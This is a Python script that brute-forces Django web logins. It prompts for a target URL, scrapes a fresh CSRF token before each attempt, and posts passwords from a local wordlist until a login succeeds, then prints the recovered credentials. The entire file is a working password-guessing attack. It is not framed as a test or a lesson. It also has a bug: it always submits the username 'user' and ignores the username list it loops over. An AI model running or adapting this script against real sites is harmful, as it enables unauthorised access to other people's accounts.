#!/usr/bin/env python3

import requests
import re
from cmd import Cmd
import sys
import time

class Terminal(Cmd):
    intro = "Django bruteforce"
    prompt = "url >> "
    
    def default(self, args):
        bruteforcer(args)
        
def bruteforcer(url):
    session = requests.session()
    #login = session.get(f"{url}/accounts/login/")
    #print(login.text)
    #csrf_token = re.search('name="csrfmiddlewaretoken" value="([0-9a-zA-z]+)"', login.text)
    #if csrf_token:
    #    csrf_token = csrf_token.group(1)
        
    usernames = ['admin', 'user', 'tom']
    with open("/home/antti/common_roots.txt", "r") as file:
        content = file.readlines()
        passwords = [x.strip() for x in content]
        
        for username in usernames:
            for password in passwords:
                login = session.get(f"{url}/accounts/login/")
                #print(login.text)
                #Get a new csrf token each time we try a new password.  
                csrf_token = re.search('name="csrfmiddlewaretoken" value="([0-9a-zA-z]+)"', login.text)
                if csrf_token:
                    csrf_token = csrf_token.group(1)
                    #print(f"csrf_token: {csrf_token}\n")
                #print(password)
                post_data = {
                    "username" : 'user',
                    "password" : password,
                    "Login" : "Login",
                    "csrfmiddlewaretoken" : csrf_token
                }
                print(post_data)
                validation = session.post(f"{url}/accounts/login/", data=post_data)
                #print (validation.text)
                #time.sleep(10)
            
                if "Your username and password didn't match. Please try again." in validation.text:
                    pass
                #elif "CSRF verification failed. Request aborted." 
                elif "CSRF token missing." in validation.text:
                    print("CSRF token is incorrect")
                    sys.exit()
                else:
                    print (f"Login success\n Your credentials are below\n {post_data['username']}:{password}")
                    print("Goodbye")
                    sys.exit()
    #print(f"csrf-token: {csrf_token}\n")
    #print(f"{url}\n")
    
if __name__ == ("__main__"):
    terminal = Terminal()
    terminal.cmdloop()
    
    